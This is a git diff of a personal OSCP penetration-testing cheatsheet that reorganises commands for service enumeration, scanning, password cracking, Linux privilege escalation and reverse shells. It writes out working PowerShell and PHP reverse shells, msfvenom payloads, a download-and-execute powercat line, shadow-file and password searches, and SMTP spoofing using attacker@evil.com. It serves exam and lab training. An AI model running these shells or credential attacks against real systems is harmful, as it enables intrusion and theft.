@@ -1,6 +1,4 @@
-# OSCP Cheatsheet
-
-### General
+### General OSCP
 
 #### VPN
 
@@ -12,15 +10,10 @@ sudo openvpn /home/kali/Documents/offsec/universal.ovpn
 
 #### SSH tip
 
-The _UserKnownHostsFile=/dev/null_ and _StrictHostKeyChecking=no_ options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.
+The `UserKnownHostsFile=/dev/null` and `StrictHostKeyChecking=no` options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.
 
 ```sh
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
-
-# Supply specific additional key to use
--i <FILE> 
-# Only use single key provided
--o 'IdentitiesOnlyyes'
 ```
 
 #### RDP
@@ -29,22 +22,94 @@ ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
 xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
 ```
 
-#### HTTP CLI Clients
-
-```sh
-curl --path-as-is -vv -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'
-curl --data-urlencode
-wget
-httpx <URL> --download file.txt
-```
-
 ### Protocols
 
 #### SSH (TCP: 22)
 
 ```sh
-# Connect with specific SSH key only
+# Connect with specific SSH key only, without trying additional keys available on the system
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' -i /path/to/key USER@IP
+```
+
+#### SMTP (TCP: 25)
+
+[https://hackviser.com/tactics/pentesting/services/smtp#connect](https://hackviser.com/tactics/pentesting/services/smtp#connect) 
+
+##### Netcat
+Connect to SMTP server via netcat and verify users/email addresses:
+
+```sh
+nc -nv IP 25
+VRFY root
+VRFY idontexist
+```
+
+##### PowerShell
+
+```ps1
+Test-NetConnection -Port 25 IP
+# Telnet (install)
+dism /online /Enable-Feature /FeatureName:TelnetClient
+telnet IP 25
+```
+
+##### Nmap
+
+``` sh
+sudo nmap -p 25,587 --script smtp-* target.com
+```
+
+##### smtp-user-enum
+
+``` sh
+# SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional
+smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M VRFY -t IP
+smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M RCPT -t IP
+smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M EXPN -t IP
+```
+
+##### Swaks
+
+```sh
+# Basic SMTP connectivity test
+swaks --to user@target.com --server target.com
+
+# Specify SMTP port
+swaks --to user@target.com --server target.com --port 25
+swaks --to user@target.com --server target.com --port 587
+swaks --to user@target.com --server target.com --port 465 --tls-on-connect
+
+# Enumerate users via RCPT TO
+swaks --to test@target.com --server target.com --quit-after RCPT
+
+# Manual MAIL FROM / RCPT TO control
+swaks --server target.com --mail-from attacker@evil.com --to victim@target.com
+
+# Test SMTP AUTH (LOGIN)
+swaks --to user@target.com --server target.com --auth LOGIN --auth-user user --auth-password pass
+
+# Test SMTP AUTH (PLAIN)
+swaks --to user@target.com --server target.com --auth PLAIN --auth-user user --auth-password pass
+
+# Spoof sender address
+swaks --to victim@target.com --from ceo@target.com --server target.com
+
+# Custom email body
+swaks --to victim@target.com --from attacker@evil.com --server target.com --data "Subject: Test\n\nBody text"
+
+# Attach local file (also try with @ in front of filename)
+swaks --to victim@target.com --server target.com --attach file.txt
+swaks --to victim@target.com --server target.com --attach @file.txt
+
+# Suppress data send (banner / capability recon)
+swaks --server target.com --quit-after EHLO
+
+# Test open relay
+swaks --to victim@external.com --from spoof@external.com --server target.com
+
+# Timeout control (avoid hanging)
+swaks --to user@target.com --server target.com --timeout 5
+
 ```
 
 #### WHOIS (TCP: 43)
@@ -56,21 +121,18 @@ whois IP
 
 #### DNS (TCP: 53)
 
-Linux:
+##### Lookup
 
 ```sh
+# Linux
 host DOMAIN
 host -t txt DOMAIN
-```
-
-Windows:
-
-```sh
+# Windows
 nslookup DOMAIN
 nslookup -type=TXT DOMAIN IP
 ```
 
-Zone transfer:
+##### Zone transfer
 
 ```sh
 # Attempt a Zone Transfer manually 
@@ -81,15 +143,93 @@ dnsrecon -d DOMAIN -t axfr
 host -t SRV _ldap._tcp.DOMAIN
 ```
 
+#### HTTP(S) (TCP: 80, 443)
+
+##### Enumeration
+
+```sh
+http://domain/robots.txt
+http://domain/sitemap.xml
+CTRL+U (page source)
+Wappalyzer
+DevTools Debugger
+```
+
+##### Interaction with CLI clients
+
+Different methods to connect to HTTP(S) services via CLI.
+
+```sh
+curl --path-as-is -vv -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'
+curl --data-urlencode
+wget
+httpx <URL> --download file.txt
+```
+
+##### Directories
+
+###### Gobuster
+
+```sh
+gobuster dir -u IP -w /usr/share/wordlists/dirb/small.txt -t 10
+```
+
+###### Feroxbuster
+
+```sh
+feroxbuster -u http://target.com
+
+# Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)
+feroxbuster -u http://target.com -w wordlist.txt -x php,asp,aspx,js,txt,pdf
+```
+
+##### Subdomains
+
+###### Manual
+
+```sh
+# Look for subdomains using wordlist
+for ip in $(cat list.txt); do host $ip.DOMAIN; done
+# Look for subdomains using PTR records (reverse DNS)
+for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
+```
+
+###### DNSRecon
+
+```sh
+# Standard scan
+dnsrecon -d DOMAIN -t std
+# Brute force with wordlist
+dnsrecon -d DOMAIN -D ~/list.txt -t brt
+```
+
+###### DNSEnum
+
+```sh
+dnsenum DOMAIN
+```
+
+###### Gobuster
+
+Can create tailored wordlist using LLM or use SecLists.
+
+```sh
+gobuster dns -d DOMAIN -w wordlist.txt -t 10
+```
+
+###### CRT.sh
+
+[crt.sh](https://crt.sh)
+
 #### SMB (TCP: 139, 445)
 
-Inside Windows environment:
+##### PowerShell
 
 ```sh
 net view \\dc01 /all
 ```
 
-##### Nmap 
+##### Nmap
 
 ```sh
 # SMB + NetBIOS
@@ -192,7 +332,7 @@ dir \\KALI_IP\test
 
 ##### Responder
 
-[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder) 
+[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
 
 ```sh
 # Receive and crack Net-NTLMv2 hash from target using Responder
@@ -206,99 +346,18 @@ dir \\IP\test
 hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
-#### SMTP (TCP: 25)
-
-[https://hackviser.com/tactics/pentesting/services/smtp#connect](https://hackviser.com/tactics/pentesting/services/smtp#connect) 
-
-Connect to SMTP server via netcat and verify users/email addresses:
-
-```sh
-nc -nv IP 25
-VRFY root
-VRFY idontexist
-```
-
-PowerShell:
-
-```sh
-Test-NetConnection -Port 25 IP 
-```
-
-Telnet (install):
-
-```sh
-dism /online /Enable-Feature /FeatureName:TelnetClient
-telnet IP 25
-```
-
-Nmap:
-
-```
-sudo nmap -p 25,587 --script smtp-* target.com
-```
-
-smtp-user-enum
-
-```
-# SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional
-smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M VRFY -t IP
-smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M RCPT -t IP
-smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M EXPN -t IP
-```
-
-swaks
-
-```sh
-# Basic SMTP connectivity test
-swaks --to user@target.com --server target.com
-
-# Specify SMTP port
-swaks --to user@target.com --server target.com --port 25
-swaks --to user@target.com --server target.com --port 587
-swaks --to user@target.com --server target.com --port 465 --tls-on-connect
-
-# Enumerate users via RCPT TO
-swaks --to test@target.com --server target.com --quit-after RCPT
-
-# Manual MAIL FROM / RCPT TO control
-swaks --server target.com --mail-from attacker@evil.com --to victim@target.com
-
-# Test SMTP AUTH (LOGIN)
-swaks --to user@target.com --server target.com --auth LOGIN --auth-user user --auth-password pass
-
-# Test SMTP AUTH (PLAIN)
-swaks --to user@target.com --server target.com --auth PLAIN --auth-user user --auth-password pass
-
-# Spoof sender address
-swaks --to victim@target.com --from ceo@target.com --server target.com
-
-# Custom email body
-swaks --to victim@target.com --from attacker@evil.com --server target.com --data "Subject: Test\n\nBody text"
-
-# Attach local file (also try with @ in front of filename)
-swaks --to victim@target.com --server target.com --attach file.txt
-swaks --to victim@target.com --server target.com --attach @file.txt
-
-# Suppress data send (banner / capability recon)
-swaks --server target.com --quit-after EHLO
-
-# Test open relay
-swaks --to victim@external.com --from spoof@external.com --server target.com
-
-# Timeout control (avoid hanging)
-swaks --to user@target.com --server target.com --timeout 5
-
-```
-
 #### SNMP (UDP: 161)
 
-Nmap scan for open SNMP ports:
+##### Nmap
 
 ```sh
+# Scan for open ports
 sudo nmap -sU --open -p IP -oG open-snmp.txt
 ```
 
-onesixtyone SNMP brute force scanner:
+##### onesixtyone
+
+SNMP brute force scanner.
 
 ```sh
 echo public > community
@@ -308,7 +367,7 @@ for ip in $(seq 1 254); do echo 192.168.0.$ip; done > ips
 onesixtyone -c community -i ips
 ```
 
-snmpwalk
+##### snmpwalk
 
 ```sh
 # With hex decode, timeout 10 sec
@@ -328,181 +387,7 @@ snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
 snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
 ```
 
-#### Scanning (ports / vulns)
-
-##### Netcat
-
-Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data):
-
-```sh
-nc -nvv -w 1 -z IP 3388-3390
-```
-
-Netcat UDP ports 120-123, 1 second timeout, zero I/O (data):
-
-```sh
-nc -nv -u -z -w 1 IP 120-123
-```
-
-##### Nikto
-
-```sh
-nikto -h http://target.com
-```
-
-##### Nmap
-
-Nmap scan all TCP ports, stealth and fast (no ACK):
-
-```sh
-sudo nmap -sU -sS -vv IP
-```
-
-Nmap discovery scan, greppable format:
-
-```sh
-nmap -v -sn IP -oG ping-sweep.txt
-grep Up ping-sweep.txt | cut -d " " -f 2
-```
-
-Nmap TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute:
-
-```sh
-nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
-```
-
-Nmap OS fingerprinting (guess):
-
-```sh
-sudo nmap -O IP --osscan-guess
-```
-
-Nmap vulnerability scan
-
-```sh
-sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
-```
-
-##### Nuclei
-
-```sh
-nuclei -target https://example.com
-```
-
-##### PowerShell
-
-PowerShell scanning (living off the land):
-
-```sh
-Test-NetConnection -Port 445 IP
-```
-
-PowerShell scan first 1024 ports:
-
-```sh
-1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
-```
-
-#### Subdomains
-
-Look for subdomains using wordlist
-
-```sh
-for ip in $(cat list.txt); do host $ip.DOMAIN; done
-```
-
-Look for subdomains using PTR records (reverse DNS):
-
-```sh
-for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
-```
-
-DNSRecon standard scan
-
-```sh
-dnsrecon -d DOMAIN -t std
-```
-
-DNSRecon brute force with wordlist
-
-```sh
-dnsrecon -d DOMAIN -D ~/list.txt -t brt
-```
-
-DNSEnum
-
-```sh
-dnsenum DOMAIN
-```
-
-GoBuster (can create tailored wordlist using LLM or use SecLists)
-
-```sh
-gobuster dns -d DOMAIN -w wordlist.txt -t 10
-```
-
-CRT.sh
-
- [crt.sh](https://crt.sh) 
-
-#### HTTP (TCP: 80)
-
-##### Enumeration
-
-```sh
-http://domain/robots.txt
-http://domain/sitemap.xml
-CTRL+U (page source)
-Wappalyzer
-DevTools Debugger
-```
-
-##### Directories
-
-GoBuster
-
-```sh
-gobuster dir -u IP -w /usr/share/wordlists/dirb/small.txt -t 10
-```
-
-Feroxbuster
-
-```sh
-feroxbuster -u http://target.com
-
-# Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)
-feroxbuster -u http://target.com -w wordlist.txt -x php,asp,aspx,js,txt,pdf
-```
-
-### Exploitation
-
-#### Exploits
-
-SearchSploit
-
-```sh
-sudo apt update && sudo apt install exploitdb
-
-# Search terms
-searchsploit afd windows local
-# Show complete path
-searchsploit -p 39446
-# Exclude
-searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
-# Strict
-searchsploit -s Apache Struts 2.0.0
-# JSON output
-searchsploit -j 55555 | json_pp
-# Download
-searchsploit -m windows/remote/48537.py
-searchsploit -m 42031
-```
-
-#### Command Injection
-
-[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md) 
-
-#### SQL Injection
+#### Databases (TCP: 3306 (MySQL))
 
 ##### MySQL
 
@@ -534,6 +419,88 @@ SELECT name FROM sys.databases;
 SELECT * FROM offsec.information_schema.tables;
 ```
 
+### Scanning (ports / vulns)
+
+#### Netcat
+
+```sh
+# Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data)
+nc -nvv -w 1 -z IP 3388-3390
+# Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
+nc -nv -u -z -w 1 IP 120-123
+```
+
+#### Nikto
+
+HTTP(S) only.
+
+```sh
+nikto -h http://target.com
+```
+
+#### Nmap
+
+```sh
+# Scan all TCP ports, stealth and fast (no ACK)
+sudo nmap -sU -sS -vv IP
+# Discovery scan, greppable format
+nmap -v -sn IP -oG ping-sweep.txt
+grep Up ping-sweep.txt | cut -d " " -f 2
+# TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute
+nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
+# OS fingerprinting (guess)
+sudo nmap -O IP --osscan-guess
+# Vulnerability scan
+sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+```
+
+#### Nuclei
+
+```sh
+nuclei -target https://example.com
+```
+
+#### PowerShell
+
+```ps1
+# PowerShell scanning (living off the land)
+Test-NetConnection -Port 445 IP
+# PowerShell scan first 1024 ports
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
+```
+
+### Exploitation
+
+#### Exploits
+
+##### SearchSploit
+
+[Exploit-DB](https://www.exploit-db.com/)
+
+```sh
+sudo apt update && sudo apt install exploitdb
+
+# Search terms
+searchsploit afd windows local
+# Show complete path
+searchsploit -p 39446
+# Exclude
+searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+# Strict
+searchsploit -s Apache Struts 2.0.0
+# JSON output
+searchsploit -j 55555 | json_pp
+# Download
+searchsploit -m windows/remote/48537.py
+searchsploit -m 42031
+```
+
+#### Command Injection
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
+
+#### SQL Injection
+
 ##### Payloads
 
 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 
@@ -557,14 +524,28 @@ sqlmap -u http://IP/index.php?user=1 -p user --os-shell
 
 [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
 
-[https://weakpass.com/](https://weakpass.com/) 
+[https://weakpass.com/](https://weakpass.com/)
 
-[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm) 
+[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
 
-[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables) 
+[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables)
+
+###### Wordlists
 
 ```sh
-# Hydra
+# Kali lists
+# Passwords
+/usr/share/wordlists/rockyou.txt
+# Usernames
+/usr/share/wordlists/dirb/others/names.txt 
+
+# Generate wordlist with min/max 6 characters (lab***)
+crunch 6 6 -t lab%%% > wordlist
+```
+
+###### Hydra
+
+```sh
 # Attempt single user name with password list
 hydra -l USER -P PASSLIST -s PORT PROTO://IP
 # Attempt login on HTTP POST form
@@ -575,19 +556,17 @@ hydra -L USERLIST -P PASSLIST IP http-get /path/to/login
 hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
 # RDP single task (throttled to limit errors)
 hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
+# SSH
+hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
+```
 
+###### JohnTheRipper
 
-
-# JohnTheRipper
+``` sh
+# Run with ruleset
 john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 # Convert SSH hash
 ssh2john id_rsa > ssh.hash 
-
-# Kali lists
-# Passwords
-/usr/share/wordlists/rockyou.txt
-# Usernames
-/usr/share/wordlists/dirb/others/names.txt 
 ```
 
 ##### Cracking
@@ -600,9 +579,10 @@ ssh2john id_rsa > ssh.hash
 
 [https://www.openwall.com/john/](https://www.openwall.com/john/) (mainly CPU, also supports GPU)
 
+###### Hashcat
+
 ```sh
-# Hashcat
-# Check hash modes
+# Check hash modes available
 hashcat -h | grep -i "ssh"
 # Benchmark mode
 hashcat -b
@@ -651,27 +631,60 @@ hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/
 
 ### Privilege Escalation
 
-[https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
+[HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
+[compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+[PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)
 
-[https://gtfobins.org/](https://gtfobins.org/) 
+#### Enumeration
 
 ```sh
-# Information gathering
+# Basics
+id
+whoami
+hostname
+uname -a
+arch
+cat /etc/os-release
+groups
+env
+set
+ps aux | cat
+# Enumerate packages and kernel modules for vulnerabilities
+dpkg -l
+lsmod
+/sbin/modinfo <BINARY>
+# Enumerate network configuration
+ip a
+route
+routel
+netstat -tulnp
+ls -la /home
 # Enumerate users
 cat /etc/passwd
+cat /etc/shadow
 # Enumerate cronjobs
 cat /etc/crontab
-# Enumerate running processes
-ps aux | cat
+crontab -l
+sudo crontab -l
+ls -la /etc/cron*
+grep -i "CRON" /var/log/syslog
+# Display processes running in Linux with pspy
+# https://github.com/dominicbreuker/pspy
 # Look for cmdline processes
 cat /proc/self/cmdline 
 # Check SSH config
+# Check for: PermitRootLogin yes
+# Check for: (#)PasswordAuthentication yes
 cat /etc/ssh/sshd_config
-
-# Find binaries with SUID bit set
+# SUID / GUID
 find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
-# Find all writable folders
+find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
+# Find all writable files/folders
 find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+find / -writable -type d 2>/dev/null
+ls -la /etc/passwd
+ls -la /etc/shadow
+ls -la /etc/sudoers
 # Look for commands in sudoers file
 sudo -l
 # Check sudo version
@@ -681,9 +694,23 @@ su USER
 # Check capabilities
 # https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
 getcap -r / 2>/dev/null
-# Check service files
+# Check services
+systemctl list-units
 systemctl status SERVICE
 /etc/systemd/system/SERVICE.service
+# Find sensitive files (examples)
+grep -r "password" / 2>/dev/null
+grep -r "pass" /home 2>/dev/null
+grep -r "key" /opt 2>/dev/null
+# Find mounted drives
+mount
+cat /etc/fstab
+# Find available disks for mounting
+lsblk
+# Files in temporary directories
+ls -la /tmp
+ls -la /var/tmp
+ls -la /dev/shm
 
 # Run Linpeas
 python3 -m http.server 80
@@ -692,14 +719,25 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-### Reverse Shell
+#### SUID/GUID
+
+Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.
+
+``` sh
+# SUID
+find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
+# GUID
+find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
+```
+
+### Reverse Shells
 
 [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)
 
-[https://www.revshells.com/](https://www.revshells.com/) 
+[https://www.revshells.com/](https://www.revshells.com/)
 
 ```sh
-# Current shell
+# Check current shell
 ps -p $$
 
 # Kali directory webshells
@@ -718,26 +756,38 @@ php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'
 # in base of Base64, make sure to encode as UTF16 first
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-# Netcat listener
-nc -nvlp 4444
-
-# Meterpreter listener
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
-
-# Powercat script (Kali) and command to execute
-cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
-IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p PORT -e powershell 
-
 # Python file hosting
 python3 -m http.server 80
 
 # Create payloads with msfvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
+```
 
-# Upgrade shell
+#### Listeners
+
+``` sh
+# Netcat listener
+nc -nvlp 4444
+
+# Meterpreter listener
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+
+# Powercat listener script (Kali) and command to execute
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p PORT -e powershell 
+```
+
+#### Upgrade shell
+
+``` sh
+# Upgrade shell with Python
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Fix on local side to make proper TTY
+Ctrl + Z
+stty raw -echo; fg
+Enter
 ```
 
 ### Windows Authentication
@@ -780,6 +830,8 @@ type C:\Windows\System32\mimilsa.log
 ../.ssh/id_rsa
 chmod 400 id_rsa
 sudo -l
+
+
 
 # Directory traversal Windows
 C:\Windows\System32\drivers\etc\hosts
